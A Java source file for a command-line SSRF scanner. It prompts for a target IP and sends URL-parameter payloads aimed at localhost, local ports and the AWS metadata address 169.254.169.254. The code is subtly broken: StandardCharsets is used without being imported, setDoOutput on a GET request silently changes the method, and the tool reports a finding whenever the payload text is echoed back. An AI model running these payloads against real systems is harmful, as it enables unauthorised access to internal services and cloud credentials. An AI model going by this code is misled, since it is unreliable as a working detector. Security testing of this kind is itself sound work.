import java.io.*;
import java.net.*;
import java.util.*;

public class SSRFDetectionTool {

    // Function to detect SSRF by injecting payloads into a URL
    public static void detectSSRF(String ipAddress) {
        System.out.println("Checking for potential SSRF vulnerabilities on " + ipAddress + "...\n");

        // List of potential SSRF payloads
        String[] ssrfPayloads = {
            "http://localhost",                // Targeting local services
            "http://127.0.0.1",                // Local IP address
            "http://169.254.169.254",          // AWS EC2 Metadata service
            "http://localhost:8080",           // Local service running on a specific port
            "http://127.0.0.1:8000",           // Another local port
            "http://example.com",              // External target
        };

        // Base URL for testing (e.g., a web page or API that accepts URLs)
        String baseUrl = "http://" + ipAddress + "/test";  // Modify this as needed to match the actual test URL

        for (String payload : ssrfPayloads) {
            // Construct the test URL by appending payload to the query string
            String testUrl = baseUrl + "?url=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);

            try {
                // Create a URL object
                URL url = new URL(testUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setDoOutput(true);

                // Get the response code and body
                int responseCode = connection.getResponseCode();
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // Check for the presence of the payload in the response
                if (response.toString().contains(payload)) {
                    System.out.println("[!] Potential SSRF vulnerability detected with payload: " + payload);
                    System.out.println("Response indicates an internal request to: " + payload);
                } else {
                    System.out.println("[+] No SSRF vulnerability detected with payload: " + payload);
                }

            } catch (IOException e) {
                System.out.println("[!] Error making request for payload " + payload + ": " + e.getMessage());
            }
        }
    }

    // Main function to prompt the user and start the detection process
    public static void main(String[] args) {
        System.out.println("=================== SSRF Detection Tool ===================");

        // Prompt the user for an IP address to test for SSRF
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter the target IP address:");
        String ipAddress = scanner.nextLine();

        // Start detecting SSRF vulnerabilities
        detectSSRF(ipAddress);
    }
}
